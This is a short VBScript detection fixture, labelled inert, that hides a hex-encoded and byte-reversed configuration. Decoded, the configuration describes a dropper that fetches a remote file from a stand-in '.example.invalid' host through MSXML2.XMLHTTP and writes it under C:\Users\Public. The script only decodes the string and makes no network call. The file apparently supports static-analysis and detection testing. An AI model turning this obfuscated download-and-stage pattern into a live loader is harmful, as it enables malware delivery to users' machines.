Option Explicit
' Huntress Script Triage -- inert static-analysis fixture (wsh_vbscript_windows)
Const Material_1190821c = "7461642e326133353636313861642d65676174735c62614c73736572746e75485c63696c6275505c73726573555c3a433d687461705f656c69667c326133353636313861642f62614c73736572746e75483d746e6567615f726573757c7461642e36343965343665362f64696c61766e692e656c706d6178652e326133353636313861642f2f3a73707474683d6c72757c326133353636313861642d6e676961706d61633d64695f6e676961706d61637c323d746e756f635f65676174737c302e362e505454484c4d582e324c4d58534d3d726574706164617c656c69665f65746972772c65746f6d65725f657269757163613d73706574737c313d76"
Const Codec_1190821c = "hex_compact|reverse_bytes|"

Function Load_1190821c()
  Dim result(), item5
  ReDim result((Len(Material_1190821c) \ 2) - 1)
  For item5 = 0 To UBound(result)
    result(item5) = CInt("&H" & Mid(Material_1190821c, item5 * 2 + 1, 2))
  Next
  Load_1190821c = result
End Function

Function Decode_1190821c(ByRef item1)
  Dim result(), item5, keyBytes, previous
  ReDim result(UBound(item1))
  For item5 = 0 To UBound(item1)
    result(UBound(item1) - item5) = item1(item5)
  Next
  Decode_1190821c = result
End Function

Function Recover_1190821c()
  Dim item1, item2, item3, item4, item5, item6, item7, item8
  ' configuration reconstruction
item4 = UBound(Array(3, 5, 8, 13))
  item1 = Load_1190821c()
  Do
    item2 = Decode_1190821c(item1)
    Exit Do
  Loop
  item3 = ""
  For item5 = 0 To UBound(item2)
    item3 = item3 & Chr(item2(item5))
  Next
' reconstruction complete
  Recover_1190821c = item3
End Function

Function Inspect_1190821c()
  Inspect_1190821c = Recover_1190821c()
End Function
